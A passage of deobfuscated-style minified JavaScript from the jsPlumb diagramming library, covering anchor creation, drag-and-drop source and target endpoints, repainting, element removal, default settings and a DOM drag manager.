                for (var f = 0; f < c.length; f++)
                    for (var g = 0; g < a.length; g++)
                        e(a[g], c[f][1], c[f][0]);
                b.jsPlumb.connectorsInitialized = !0
            }
            v || (sa(),
            h.anchorManager = new b.jsPlumb.AnchorManager({
                jsPlumbInstance: h
            }),
            v = !0,
            h.fire("ready", h))
        }
        .bind(this),
        this.log = u,
        this.jsPlumbUIComponent = m,
        this.makeAnchor = function() {
            var a, c = function(a, c) {
                if (b.jsPlumb.Anchors[a])
                    return new b.jsPlumb.Anchors[a](c);
                if (!h.Defaults.DoNotThrowErrors)
                    throw {
                        msg: "jsPlumb: unknown anchor type '" + a + "'"
                    }
            };
            if (0 === arguments.length)
                return null;
            var e = arguments[0]
              , f = arguments[1]
              , g = (arguments[2],
            null);
            if (e.compute && e.getOrientation)
                return e;
            if ("string" == typeof e)
                g = c(arguments[0], {
                    elementId: f,
                    jsPlumbInstance: h
                });
            else if (d.isArray(e))
                if (d.isArray(e[0]) || d.isString(e[0]))
                    2 === e.length && d.isObject(e[1]) ? d.isString(e[0]) ? (a = b.jsPlumb.extend({
                        elementId: f,
                        jsPlumbInstance: h
                    }, e[1]),
                    g = c(e[0], a)) : (a = b.jsPlumb.extend({
                        elementId: f,
                        jsPlumbInstance: h,
                        anchors: e[0]
                    }, e[1]),
                    g = new b.jsPlumb.DynamicAnchor(a)) : g = new r.DynamicAnchor({
                        anchors: e,
                        selector: null,
                        elementId: f,
                        jsPlumbInstance: h
                    });
                else {
                    var i = {
                        x: e[0],
                        y: e[1],
                        orientation: e.length >= 4 ? [e[2], e[3]] : [0, 0],
                        offsets: e.length >= 6 ? [e[4], e[5]] : [0, 0],
                        elementId: f,
                        jsPlumbInstance: h,
                        cssClass: 7 === e.length ? e[6] : null
                    };
                    g = new b.jsPlumb.Anchor(i),
                    g.clone = function() {
                        return new b.jsPlumb.Anchor(i)
                    }
                }
            return g.id || (g.id = "anchor_" + J()),
            g
        }
        ,
        this.makeAnchors = function(a, c, e) {
            for (var f = [], g = 0, i = a.length; g < i; g++)
                "string" == typeof a[g] ? f.push(b.jsPlumb.Anchors[a[g]]({
                    elementId: c,
                    jsPlumbInstance: e
                })) : d.isArray(a[g]) && f.push(h.makeAnchor(a[g], c, e));
            return f
        }
        ,
        this.makeDynamicAnchor = function(a, c) {
            return new b.jsPlumb.DynamicAnchor({
                anchors: a,
                selector: c,
                elementId: null,
                jsPlumbInstance: h
            })
        }
        ,
        this.targetEndpointDefinitions = {},
        this.sourceEndpointDefinitions = {};
        var va = function(a, b, c, d, e) {
            for (var f = a.target || a.srcElement, g = !1, h = d.getSelector(b, c), i = 0; i < h.length; i++)
                if (h[i] === f) {
                    g = !0;
                    break
                }
            return e ? !g : g
        }
          , wa = function(a, c, e, f, g) {
            var i = new m(c)
              , j = c._jsPlumb.EndpointDropHandler({
                jsPlumb: h,
                enabled: function() {
                    return a.def.enabled
                },
                isFull: function() {
                    var b = h.select({
                        target: a.id
                    }).length;
                    return a.def.maxConnections > 0 && b >= a.def.maxConnections
                },
                element: a.el,
                elementId: a.id,
                isSource: f,
                isTarget: g,
                addClass: function(b) {
                    h.addClass(a.el, b)
                },
                removeClass: function(b) {
                    h.removeClass(a.el, b)
                },
                onDrop: function(a) {
                    var b = a.endpoints[0];
                    b.anchor.locked = !1
                },
                isDropAllowed: function() {
                    return i.isDropAllowed.apply(i, arguments)
                },
                isRedrop: function(b) {
                    return null != b.suspendedElement && null != b.suspendedEndpoint && b.suspendedEndpoint.element === a.el
                },
                getEndpoint: function(d) {
                    var e = a.def.endpoint;
                    if (null == e || null == e._jsPlumb) {
                        var f = h.deriveEndpointAndAnchorSpec(d.getType().join(" "), !0)
                          , g = f.endpoints ? b.jsPlumb.extend(c, {
                            endpoint: a.def.def.endpoint || f.endpoints[1]
                        }) : c;
                        f.anchors && (g = b.jsPlumb.extend(g, {
                            anchor: a.def.def.anchor || f.anchors[1]
                        })),
                        e = h.addEndpoint(a.el, g),
                        e._mtNew = !0
                    }
                    if (c.uniqueEndpoint && (a.def.endpoint = e),
                    e.setDeleteOnEmpty(!0),
                    d.isDetachable() && e.initDraggable(),
                    null != e.anchor.positionFinder) {
                        var i = h.getUIPosition(arguments, h.getZoom())
                          , j = h.getOffset(a.el)
                          , k = h.getSize(a.el)
                          , l = null == i ? [0, 0] : e.anchor.positionFinder(i, j, k, e.anchor.constructorParams);
                        e.anchor.x = l[0],
                        e.anchor.y = l[1]
                    }
                    return e
                },
                maybeCleanup: function(a) {
                    a._mtNew && 0 === a.connections.length ? h.deleteObject({
                        endpoint: a
                    }) : delete a._mtNew
                }
            })
              , k = b.jsPlumb.dragEvents.drop;
            return e.scope = e.scope || c.scope || h.Defaults.Scope,
            e[k] = d.wrap(e[k], j, !0),
            g && (e[b.jsPlumb.dragEvents.over] = function() {
                return !0
            }
            ),
            c.allowLoopback === !1 && (e.canDrop = function(b) {
                var c = b.getDragElement()._jsPlumbRelatedElement;
                return c !== a.el
            }
            ),
            h.initDroppable(a.el, e, "internal"),
            j
        };
        this.makeTarget = function(a, c, d) {
            var e = b.jsPlumb.extend({
                _jsPlumb: this
            }, d);
            b.jsPlumb.extend(e, c);
            for (var f = e.maxConnections || -1, g = function(a) {
                var c = o(a)
                  , d = c.id
                  , g = b.jsPlumb.extend({}, e.dropOptions || {})
                  , h = e.connectionType || "default";
                this.targetEndpointDefinitions[d] = this.targetEndpointDefinitions[d] || {},
                ra(d),
                c.el._isJsPlumbGroup && null == g.rank && (g.rank = -1);
                var i = {
                    def: b.jsPlumb.extend({}, e),
                    uniqueEndpoint: e.uniqueEndpoint,
                    maxConnections: f,
                    enabled: !0
                };
                c.def = i,
                this.targetEndpointDefinitions[d][h] = i,
                wa(c, e, g, e.isSource === !0, !0),
                c.el._katavorioDrop[c.el._katavorioDrop.length - 1].targetDef = i
            }
            .bind(this), h = a.length && a.constructor !== String ? a : [a], i = 0, j = h.length; i < j; i++)
                g(h[i]);
            return this
        }
        ,
        this.unmakeTarget = function(a, b) {
            var c = o(a);
            return h.destroyDroppable(c.el, "internal"),
            b || delete this.targetEndpointDefinitions[c.id],
            this
        }
        ,
        this.makeSource = function(a, c, e) {
            var f = b.jsPlumb.extend({
                _jsPlumb: this
            }, e);
            b.jsPlumb.extend(f, c);
            var g = f.connectionType || "default"
              , i = h.deriveEndpointAndAnchorSpec(g);
            f.endpoint = f.endpoint || i.endpoints[0],
            f.anchor = f.anchor || i.anchors[0];
            for (var j = f.maxConnections || -1, k = f.onMaxConnections, l = function(a) {
                var c = a.id
                  , e = this.getElement(a.el);
                this.sourceEndpointDefinitions[c] = this.sourceEndpointDefinitions[c] || {},
                ra(c);
                var i = {
                    def: b.jsPlumb.extend({}, f),
                    uniqueEndpoint: f.uniqueEndpoint,
                    maxConnections: j,
                    enabled: !0
                };
                this.sourceEndpointDefinitions[c][g] = i,
                a.def = i;
                var l = b.jsPlumb.dragEvents.stop
                  , m = b.jsPlumb.dragEvents.drag
                  , o = b.jsPlumb.extend({}, f.dragOptions || {})
                  , p = o.drag
                  , q = o.stop
                  , r = null
                  , s = !1;
                o.scope = o.scope || f.scope,
                o[m] = d.wrap(o[m], function() {
                    p && p.apply(this, arguments),
                    s = !1
                }),
                o[l] = d.wrap(o[l], function() {
                    if (q && q.apply(this, arguments),
                    this.currentlyDragging = !1,
                    null != r._jsPlumb) {
                        var a = f.anchor || this.Defaults.Anchor
                          , b = r.anchor
                          , d = r.connections[0]
                          , e = this.makeAnchor(a, c, this)
                          , g = r.element;
                        if (null != e.positionFinder) {
                            var i = h.getOffset(g)
                              , j = this.getSize(g)
                              , k = {
                                left: i.left + b.x * j[0],
                                top: i.top + b.y * j[1]
                            }
                              , l = e.positionFinder(k, i, j, e.constructorParams);
                            e.x = l[0],
                            e.y = l[1]
                        }
                        r.setAnchor(e, !0),
                        r.repaint(),
                        this.repaint(r.elementId),
                        null != d && this.repaint(d.targetId)
                    }
                }
                .bind(this));
                var t = function(i) {
                    if (3 !== i.which && 2 !== i.button) {
                        var l = this.sourceEndpointDefinitions[c][g];
                        if (l.enabled) {
                            if (c = this.getId(this.getElement(a.el)),
                            f.filter) {
                                var m = d.isString(f.filter) ? va(i, a.el, f.filter, this, f.filterExclude) : f.filter(i, a.el);
                                if (m === !1)
                                    return
                            }
                            var p = this.select({
                                source: c
                            }).length;
                            if (l.maxConnections >= 0 && p >= l.maxConnections)
                                return k && k({
                                    element: a.el,
                                    maxConnections: j
                                }, i),
                                !1;
                            var q = b.jsPlumb.getPositionOnElement(i, e, n)
                              , t = {};
                            b.jsPlumb.extend(t, f),
                            t.isTemporarySource = !0,
                            t.anchor = [q[0], q[1], 0, 0],
                            t.dragOptions = o,
                            l.def.scope && (t.scope = l.def.scope),
                            r = this.addEndpoint(c, t),
                            s = !0,
                            r.setDeleteOnEmpty(!0),
                            l.uniqueEndpoint && (l.endpoint ? r.finalEndpoint = l.endpoint : (l.endpoint = r,
                            r.setDeleteOnEmpty(!1)));
                            var u = function() {
                                h.off(r.canvas, "mouseup", u),
                                h.off(a.el, "mouseup", u),
                                s && (s = !1,
                                h.deleteEndpoint(r))
                            };
                            h.on(r.canvas, "mouseup", u),
                            h.on(a.el, "mouseup", u);
                            var v = {};
                            if (l.def.extract)
                                for (var w in l.def.extract) {
                                    var x = (i.srcElement || i.target).getAttribute(w);
                                    x && (v[l.def.extract[w]] = x)
                                }
                            h.trigger(r.canvas, "mousedown", i, v),
                            d.consume(i)
                        }
                    }
                }
                .bind(this);
                this.on(a.el, "mousedown", t),
                i.trigger = t,
                f.filter && (d.isString(f.filter) || d.isFunction(f.filter)) && h.setDragFilter(a.el, f.filter);
                var u = b.jsPlumb.extend({}, f.dropOptions || {});
                wa(a, f, u, !0, f.isTarget === !0)
            }
            .bind(this), m = a.length && a.constructor !== String ? a : [a], p = 0, q = m.length; p < q; p++)
                l(o(m[p]));
            return this
        }
        ,
        this.unmakeSource = function(a, b, c) {
            var d = o(a);
            h.destroyDroppable(d.el, "internal");
            var e = this.sourceEndpointDefinitions[d.id];
            if (e)
                for (var f in e)
                    if (null == b || b === f) {
                        var g = e[f].trigger;
                        g && h.off(d.el, "mousedown", g),
                        c || delete this.sourceEndpointDefinitions[d.id][f]
                    }
            return this
        }
        ,
        this.unmakeEverySource = function() {
            for (var a in this.sourceEndpointDefinitions)
                h.unmakeSource(a, null, !0);
            return this.sourceEndpointDefinitions = {},
            this
        }
        ;
        var xa = function(a, b, c) {
            b = d.isArray(b) ? b : [b];
            var e = Z(a);
            c = c || "default";
            for (var f = 0; f < b.length; f++) {
                var g = this[b[f]][e];
                if (g && g[c])
                    return g[c].def.scope || this.Defaults.Scope
            }
        }
        .bind(this)
          , ya = function(a, b, c, e) {
            c = d.isArray(c) ? c : [c];
            var f = Z(a);
            e = e || "default";
            for (var g = 0; g < c.length; g++) {
                var h = this[c[g]][f];
                h && h[e] && (h[e].def.scope = b)
            }
        }
        .bind(this);
        this.getScope = function(a, b) {
            return xa(a, ["sourceEndpointDefinitions", "targetEndpointDefinitions"])
        }
        ,
        this.getSourceScope = function(a) {
            return xa(a, "sourceEndpointDefinitions")
        }
        ,
        this.getTargetScope = function(a) {
            return xa(a, "targetEndpointDefinitions")
        }
        ,
        this.setScope = function(a, b, c) {
            this.setSourceScope(a, b, c),
            this.setTargetScope(a, b, c)
        }
        ,
        this.setSourceScope = function(a, b, c) {
            ya(a, b, "sourceEndpointDefinitions", c),
            this.setDragScope(a, b)
        }
        ,
        this.setTargetScope = function(a, b, c) {
            ya(a, b, "targetEndpointDefinitions", c),
            this.setDropScope(a, b)
        }
        ,
        this.unmakeEveryTarget = function() {
            for (var a in this.targetEndpointDefinitions)
                h.unmakeTarget(a, !0);
            return this.targetEndpointDefinitions = {},
            this
        }
        ;
        var za = function(a, b, c, e, f) {
            var g, i, j, k = "source" === a ? this.sourceEndpointDefinitions : this.targetEndpointDefinitions;
            if (f = f || "default",
            b.length && !d.isString(b)) {
                g = [];
                for (var l = 0, m = b.length; l < m; l++)
                    i = o(b[l]),
                    k[i.id] && k[i.id][f] && (g[l] = k[i.id][f].enabled,
                    j = e ? !g[l] : c,
                    k[i.id][f].enabled = j,
                    h[j ? "removeClass" : "addClass"](i.el, "jtk-" + a + "-disabled"))
            } else {
                i = o(b);
                var n = i.id;
                k[n] && k[n][f] && (g = k[n][f].enabled,
                j = e ? !g : c,
                k[n][f].enabled = j,
                h[j ? "removeClass" : "addClass"](i.el, "jtk-" + a + "-disabled"))
            }
            return g
        }
        .bind(this)
          , Aa = function(a, b) {
            return d.isString(a) || !a.length ? b.apply(this, [a]) : a.length ? b.apply(this, [a[0]]) : void 0
        }
        .bind(this);
        this.toggleSourceEnabled = function(a, b) {
            return za("source", a, null, !0, b),
            this.isSourceEnabled(a, b)
        }
        ,
        this.setSourceEnabled = function(a, b, c) {
            return za("source", a, b, null, c)
        }
        ,
        this.isSource = function(a, b) {
            return b = b || "default",
            Aa(a, function(a) {
                var c = this.sourceEndpointDefinitions[o(a).id];
                return null != c && null != c[b]
            }
            .bind(this))
        }
        ,
        this.isSourceEnabled = function(a, b) {
            return b = b || "default",
            Aa(a, function(a) {
                var c = this.sourceEndpointDefinitions[o(a).id];
                return c && c[b] && c[b].enabled === !0
            }
            .bind(this))
        }
        ,
        this.toggleTargetEnabled = function(a, b) {
            return za("target", a, null, !0, b),
            this.isTargetEnabled(a, b)
        }
        ,
        this.isTarget = function(a, b) {
            return b = b || "default",
            Aa(a, function(a) {
                var c = this.targetEndpointDefinitions[o(a).id];
                return null != c && null != c[b]
            }
            .bind(this))
        }
        ,
        this.isTargetEnabled = function(a, b) {
            return b = b || "default",
            Aa(a, function(a) {
                var c = this.targetEndpointDefinitions[o(a).id];
                return c && c[b] && c[b].enabled === !0
            }
            .bind(this))
        }
        ,
        this.setTargetEnabled = function(a, b, c) {
            return za("target", a, b, null, c)
        }
        ,
        this.ready = function(a) {
            h.bind("ready", a)
        }
        ;
        var Ba = function(a, b) {
            if ("object" == typeof a && a.length)
                for (var c = 0, d = a.length; c < d; c++)
                    b(a[c]);
            else
                b(a);
            return h
        };
        this.repaint = function(a, b, c) {
            return Ba(a, function(a) {
                L(a, b, c)
            })
        }
        ,
        this.revalidate = function(a, b, c) {
            return Ba(a, function(a) {
                var d = c ? a : h.getId(a);
                h.updateOffset({
                    elId: d,
                    recalc: !0,
                    timestamp: b
                });
                var e = h.getDragManager();
                e && e.updateOffsets(d),
                h.repaint(a)
            })
        }
        ,
        this.repaintEverything = function() {
            var a, b = e();
            for (a in x)
                h.updateOffset({
                    elId: a,
                    recalc: !0,
                    timestamp: b
                });
            for (a in x)
                L(a, null, b);
            return this
        }
        ,
        this.removeAllEndpoints = function(a, b, c) {
            c = c || [];
            var d = function(a) {
                var e, f, g = o(a), i = x[g.id];
                if (i)
                    for (c.push(g),
                    e = 0,
                    f = i.length; e < f; e++)
                        h.deleteEndpoint(i[e], !1);
                if (delete x[g.id],
                b && g.el && 3 !== g.el.nodeType && 8 !== g.el.nodeType)
                    for (e = 0,
                    f = g.el.childNodes.length; e < f; e++)
                        d(g.el.childNodes[e])
            };
            return d(a),
            this
        }
        ;
        var Ca = function(a, b) {
            h.removeAllEndpoints(a.id, !0, b);
            for (var c = h.getDragManager(), d = function(a) {
                c && c.elementRemoved(a.id),
                h.anchorManager.clearFor(a.id),
                h.anchorManager.removeFloatingConnection(a.id),
                h.isSource(a.el) && h.unmakeSource(a.el),
                h.isTarget(a.el) && h.unmakeTarget(a.el),
                h.destroyDraggable(a.el),
                h.destroyDroppable(a.el),
                delete h.floatingConnections[a.id],
                delete z[a.id],
                delete A[a.id],
                a.el && (h.removeElement(a.el),
                a.el._jsPlumb = null)
            }, e = 1; e < b.length; e++)
                d(b[e]);
            d(a)
        };
        this.remove = function(a, b) {
            var c = o(a)
              , d = [];
            return c.text ? c.el.parentNode.removeChild(c.el) : c.id && h.batch(function() {
                Ca(c, d)
            }, b === !1),
            h
        }
        ,
        this.empty = function(a, b) {
            var c = []
              , d = function(a, b) {
                var e = o(a);
                if (e.text)
                    e.el.parentNode.removeChild(e.el);
                else if (e.el) {
                    for (; e.el.childNodes.length > 0; )
                        d(e.el.childNodes[0]);
                    b || Ca(e, c)
                }
            };
            return h.batch(function() {
                d(a, !0)
            }, b === !1),
            h
        }
        ,
        this.reset = function() {
            h.silently(function() {
                qa = !1,
                h.removeAllGroups(),
                h.removeGroupManager(),
                h.deleteEveryEndpoint(),
                h.unbind(),
                this.targetEndpointDefinitions = {},
                this.sourceEndpointDefinitions = {},
                w.length = 0,
                this.doReset && this.doReset()
            }
            .bind(this))
        }
        ;
        var Da = function(a) {
            a.canvas && a.canvas.parentNode && a.canvas.parentNode.removeChild(a.canvas),
            a.cleanup(),
            a.destroy()
        };
        this.clear = function() {
            h.select().each(Da),
            h.selectEndpoints().each(Da),
            x = {},
            y = {}
        }
        ,
        this.setDefaultScope = function(a) {
            return H = a,
            h
        }
        ,
        this.setDraggable = U,
        this.deriveEndpointAndAnchorSpec = function(a, b) {
            for (var c = ((b ? "" : "default ") + a).split(/[\s]/), d = null, e = null, f = null, g = null, i = 0; i < c.length; i++) {
                var j = h.getType(c[i], "connection");
                j && (j.endpoints && (d = j.endpoints),
                j.endpoint && (e = j.endpoint),
                j.anchors && (g = j.anchors),
                j.anchor && (f = j.anchor))
            }
            return {
                endpoints: d ? d : [e, e],
                anchors: g ? g : [f, f]
            }
        }
        ,
        this.setId = function(a, b, c) {
            var e;
            d.isString(a) ? e = a : (a = this.getElement(a),
            e = this.getId(a));
            var f = this.getConnections({
                source: e,
                scope: "*"
            }, !0)
              , g = this.getConnections({
                target: e,
                scope: "*"
            }, !0);
            b = "" + b,
            c ? a = this.getElement(b) : (a = this.getElement(e),
            this.setAttribute(a, "id", b)),
            x[b] = x[e] || [];
            for (var h = 0, i = x[b].length; h < i; h++)
                x[b][h].setElementId(b),
                x[b][h].setReferenceElement(a);
            delete x[e],
            this.sourceEndpointDefinitions[b] = this.sourceEndpointDefinitions[e],
            delete this.sourceEndpointDefinitions[e],
            this.targetEndpointDefinitions[b] = this.targetEndpointDefinitions[e],
            delete this.targetEndpointDefinitions[e],
            this.anchorManager.changeId(e, b);
            var j = this.getDragManager();
            j && j.changeId(e, b),
            z[b] = z[e],
            delete z[e];
            var k = function(c, d, e) {
                for (var f = 0, g = c.length; f < g; f++)
                    c[f].endpoints[d].setElementId(b),
                    c[f].endpoints[d].setReferenceElement(a),
                    c[f][e + "Id"] = b,
                    c[f][e] = a
            };
            k(f, 0, "source"),
            k(g, 1, "target"),
            this.repaint(b)
        }
        ,
        this.setDebugLog = function(a) {
            u = a
        }
        ,
        this.setSuspendDrawing = function(a, b) {
            var c = F;
            return F = a,
            G = a ? (new Date).getTime() : null,
            b && this.repaintEverything(),
            c
        }
        ,
        this.isSuspendDrawing = function() {
            return F
        }
        ,
        this.getSuspendedAt = function() {
            return G
        }
        ,
        this.batch = function(a, b) {
            var c = this.isSuspendDrawing();
            c || this.setSuspendDrawing(!0);
            try {
                a()
            } catch (a) {
                d.log("Function run while suspended failed", a)
            }
            c || this.setSuspendDrawing(!1, !b)
        }
        ,
        this.doWhileSuspended = this.batch,
        this.getCachedData = Y,
        this.timestamp = e,
        this.show = function(a, b) {
            return V(a, "block", b),
            h
        }
        ,
        this.toggleVisible = X,
        this.toggleDraggable = W,
        this.addListener = this.bind
    }
    ;
    d.extend(b.jsPlumbInstance, d.EventGenerator, {
        setAttribute: function(a, b, c) {
            this.setAttribute(a, b, c)
        },
        getAttribute: function(a, c) {
            return this.getAttribute(b.jsPlumb.getElement(a), c)
        },
        convertToFullOverlaySpec: function(a) {
            return d.isString(a) && (a = [a, {}]),
            a[1].id = a[1].id || d.uuid(),
            a
        },
        registerConnectionType: function(a, c) {
            if (this._connectionTypes[a] = b.jsPlumb.extend({}, c),
            c.overlays) {
                for (var d = {}, e = 0; e < c.overlays.length; e++) {
                    var f = this.convertToFullOverlaySpec(c.overlays[e]);
                    d[f[1].id] = f
                }
                this._connectionTypes[a].overlays = d
            }
        },
        registerConnectionTypes: function(a) {
            for (var b in a)
                this.registerConnectionType(b, a[b])
        },
        registerEndpointType: function(a, c) {
            if (this._endpointTypes[a] = b.jsPlumb.extend({}, c),
            c.overlays) {
                for (var d = {}, e = 0; e < c.overlays.length; e++) {
                    var f = this.convertToFullOverlaySpec(c.overlays[e]);
                    d[f[1].id] = f
                }
                this._endpointTypes[a].overlays = d
            }
        },
        registerEndpointTypes: function(a) {
            for (var b in a)
                this.registerEndpointType(b, a[b])
        },
        getType: function(a, b) {
            return "connection" === b ? this._connectionTypes[a] : this._endpointTypes[a]
        },
        setIdChanged: function(a, b) {
            this.setId(a, b, !0)
        },
        setParent: function(a, b) {
            var c = this.getElement(a)
              , d = this.getId(c)
              , e = this.getElement(b)
              , f = this.getId(e)
              , g = this.getDragManager();
            c.parentNode.removeChild(c),
            e.appendChild(c),
            g && g.setParent(c, d, e, f)
        },
        extend: function(a, b, c) {
            var d;
            if (c)
                for (d = 0; d < c.length; d++)
                    a[c[d]] = b[c[d]];
            else
                for (d in b)
                    a[d] = b[d];
            return a
        },
        floatingConnections: {},
        getFloatingAnchorIndex: function(a) {
            return a.endpoints[0].isFloating() ? 0 : a.endpoints[1].isFloating() ? 1 : -1
        }
    }),
    q.prototype.Defaults = {
        Anchor: "Bottom",
        Anchors: [null, null],
        ConnectionsDetachable: !0,
        ConnectionOverlays: [],
        Connector: "Bezier",
        Container: null,
        DoNotThrowErrors: !1,
        DragOptions: {},
        DropOptions: {},
        Endpoint: "Dot",
        EndpointOverlays: [],
        Endpoints: [null, null],
        EndpointStyle: {
            fill: "#456"
        },
        EndpointStyles: [null, null],
        EndpointHoverStyle: null,
        EndpointHoverStyles: [null, null],
        HoverPaintStyle: null,
        LabelStyle: {
            color: "black"
        },
        LogEnabled: !1,
        Overlays: [],
        MaxConnections: 1,
        PaintStyle: {
            "stroke-width": 4,
            stroke: "#456"
        },
        ReattachConnections: !1,
        RenderMode: "svg",
        Scope: "jsPlumb_DefaultScope"
    };
    var r = new q;
    b.jsPlumb = r,
    r.getInstance = function(a, b) {
        var c = new q(a);
        if (b)
            for (var d in b)
                c[d] = b[d];
        return c.init(),
        c
    }
    ,
    r.each = function(a, b) {
        if (null != a)
            if ("string" == typeof a)
                b(r.getElement(a));
            else if (null != a.length)
                for (var c = 0; c < a.length; c++)
                    b(r.getElement(a[c]));
            else
                b(a)
    }
    ,
    "undefined" != typeof exports && (exports.jsPlumb = r)
}
.call("undefined" != typeof window ? window : this),
function() {
    var a = this
      , b = a.jsPlumbUtil
      , c = function(a, b) {
        if (null == b)
            return [0, 0];
        var c = h(b)
          , d = g(c, 0);
        return [d[a + "X"], d[a + "Y"]]
    }
      , d = c.bind(this, "page")
      , e = c.bind(this, "screen")
      , f = c.bind(this, "client")
      , g = function(a, b) {
        return a.item ? a.item(b) : a[b]
    }
      , h = function(a) {
        return a.touches && a.touches.length > 0 ? a.touches : a.changedTouches && a.changedTouches.length > 0 ? a.changedTouches : a.targetTouches && a.targetTouches.length > 0 ? a.targetTouches : [a]
    }
      , i = function(a) {
        var b = {}
          , c = []
          , d = {}
          , e = {}
          , f = {};
        this.register = function(g) {
            var h = a.getId(g)
              , i = a.getOffset(g);
            b[h] || (b[h] = g,
            c.push(g),
            d[h] = {});
            var j = function(b) {
                if (b)
                    for (var c = 0; c < b.childNodes.length; c++)
                        if (3 !== b.childNodes[c].nodeType && 8 !== b.childNodes[c].nodeType) {
                            var g = jsPlumb.getElement(b.childNodes[c])
                              , k = a.getId(b.childNodes[c], null, !0);
                            if (k && e[k] && e[k] > 0) {
                                var l = a.getOffset(g);
                                d[h][k] = {
                                    id: k,
                                    offset: {
                                        left: l.left - i.left,
                                        top: l.top - i.top
                                    }
                                },
                                f[k] = h
                            }
                            j(b.childNodes[c])
                        }
            };
            j(g)
        }
        ,
        this.updateOffsets = function(b, c) {
            if (null != b) {
                c = c || {};
                var e = jsPlumb.getElement(b)
                  , g = a.getId(e)
                  , h = d[g]
                  , i = a.getOffset(e);
                if (h)
                    for (var j in h)
                        if (h.hasOwnProperty(j)) {
                            var k = jsPlumb.getElement(j)
                              , l = c[j] || a.getOffset(k);
                            if (null == k.offsetParent && null != d[g][j])
                                continue;
                            d[g][j] = {
                                id: j,
                                offset: {
                                    left: l.left - i.left,
                                    top: l.top - i.top
                                }
                            },
                            f[j] = g
                        }
            }
        }
        ,
        this.endpointAdded = function(c, g) {
            g = g || a.getId(c);
            var h = document.body
              , i = c.parentNode;
            for (e[g] = e[g] ? e[g] + 1 : 1; null != i && i !== h; ) {
                var j = a.getId(i, null, !0);
                if (j && b[j]) {
                    var k = a.getOffset(i);
                    if (null == d[j][g]) {
                        var l = a.getOffset(c);
                        d[j][g] = {
                            id: g,
                            offset: {
                                left: l.left - k.left,
                                top: l.top - k.top
                            }
                        },
                        f[g] = j
                    }
                    break
                }
                i = i.parentNode
            }
        }
        ,
        this.endpointDeleted = function(a) {
            if (e[a.elementId] && (e[a.elementId]--,
            e[a.elementId] <= 0))
                for (var b in d)
                    d.hasOwnProperty(b) && d[b] && (delete d[b][a.elementId],
                    delete f[a.elementId])
        }
        ,
        this.changeId = function(a, b) {
            d[b] = d[a],
            d[a] = {},
            f[b] = f[a],
            f[a] = null
        }
        ,
        this.getElementsForDraggable = function(a) {
            return d[a]
        }
        ,
        this.elementRemoved = function(a) {
            var b = f[a];
            b && (delete d[b][a],
            delete f[a])
        }
        ,
        this.reset = function() {
            b = {},
            c = [],
            d = {},
            e = {}
        }
        ,
        this.dragEnded = function(b) {
            if (null != b.offsetParent) {
                var c = a.getId(b)
                  , d = f[c];
                d && this.updateOffsets(d)
            }
        }
        ,
        this.setParent = function(b, c, e, g, h) {
            var i = f[c];
            d[g] || (d[g] = {});
            var j = a.getOffset(e)
              , k = h || a.getOffset(b);
            i && d[i] && delete d[i][c],
            d[g][c] = {
                id: c,
                offset: {
                    left: k.left - j.left,
                    top: k.top - j.top
                }
            },
            f[c] = g
        }
        ,
        this.clearParent = function(a, b) {
            var c = f[b];
            c && (delete d[c][b],
            delete f[b])
        }
        ,
        this.revalidateParent = function(b, c, d) {
            var e = f[c];
            if (e) {
                var g = {};
                g[c] = d,
                this.updateOffsets(e, g),
                a.revalidate(e)
            }
        }
        ,
        this.getDragAncestor = function(b) {
            var c = jsPlumb.getElement(b)
              , d = a.getId(c)
              , e = f[d];
            return e ? jsPlumb.getElement(e) : null
        }
    }
      , j = function(a) {
        return null == a ? null : a.replace(/^\s\s*/, "").replace(/\s\s*$/, "")
    }
      , k = function(a, b) {
        b = j(b),
        "undefined" != typeof a.className.baseVal ? a.className.baseVal = b : a.className = b
    }
      , l = function(a) {
        return "undefined" == typeof a.className.baseVal ? a.className : a.className.baseVal
    }
      , m = function(a, c, d) {
        c = null == c ? [] : b.isArray(c) ? c : c.split(/\s+/),
        d = null == d ? [] : b.isArray(d) ? d : d.split(/\s+/);
        var e = l(a)
          , f = e.split(/\s+/)
          , g = function(a, b) {
            for (var c = 0; c < b.length; c++)
                if (a)
                    f.indexOf(b[c]) === -1 && f.push(b[c]);
                else {
                    var d = f.indexOf(b[c]);
                    d !== -1 && f.splice(d, 1)
                }
        };
        g(!0, c),
        g(!1, d),
        k(a, f.join(" "))
    };
    a.jsPlumb.extend(a.jsPlumbInstance.prototype, {
        headless: !1,
        pageLocation: d,
        screenLocation: e,
        clientLocation: f,
        getDragManager: function() {
            return null == this.dragManager && (this.dragManager = new i(this)),
            this.dragManager
        },
        recalculateOffsets: function(a) {
            this.getDragManager().updateOffsets(a)
        },
        createElement: function(a, b, c, d) {
            return this.createElementNS(null, a, b, c, d)
        },
        createElementNS: function(a, b, c, d, e) {
            var f, g = null == a ? document.createElement(b) : document.createElementNS(a, b);
            c = c || {};
            for (f in c)
                g.style[f] = c[f];
            d && (g.className = d),
            e = e || {};
            for (f in e)
                g.setAttribute(f, "" + e[f]);
            return g
        },
        getAttribute: function(a, b) {
            return null != a.getAttribute ? a.getAttribute(b) : null
        },
        setAttribute: function(a, b, c) {
            null != a.setAttribute && a.setAttribute(b, c)
        },
        setAttributes: function(a, b) {
            for (var c in b)
                b.hasOwnProperty(c) && a.setAttribute(c, b[c])
        },
        appendToRoot: function(a) {
            document.body.appendChild(a)
        },
        getRenderModes: function() {
            return ["svg"]
        },
        getClass: l,
        addClass: function(a, b) {
            jsPlumb.each(a, function(a) {
                m(a, b)
            })
        },
        hasClass: function(a, b) {
            return a = jsPlumb.getElement(a),
            a.classList ? a.classList.contains(b) : l(a).indexOf(b) !== -1
        },
        removeClass: function(a, b) {
            jsPlumb.each(a, function(a) {
                m(a, null, b)
            })
        },
        updateClasses: function(a, b, c) {
            jsPlumb.each(a, function(a) {
                m(a, b, c)
            })
        },
        setClass: function(a, b) {
            jsPlumb.each(a, function(a) {
                k(a, b)
            })
        },
        setPosition: function(a, b) {
            a.style.left = b.left + "px",
            a.style.top = b.top + "px"
        },
        getPosition: function(a) {
            var b = function(b) {
                var c = a.style[b];
                return c ? c.substring(0, c.length - 2) : 0
            };
            return {
                left: b("left"),
                top: b("top")
            }
        },
        getStyle: function(a, b) {
            return "undefined" != typeof window.getComputedStyle ? getComputedStyle(a, null).getPropertyValue(b) : a.currentStyle[b]
        },
        getSelector: function(a, b) {
            var c = null;
            return c = 1 === arguments.length ? null != a.nodeType ? a : document.querySelectorAll(a) : a.querySelectorAll(b)
        },
        getOffset: function(a, b, c) {
            a = jsPlumb.getElement(a),
            c = c || this.getContainer();
            for (var d = {
                left: a.offsetLeft,
                top: a.offsetTop
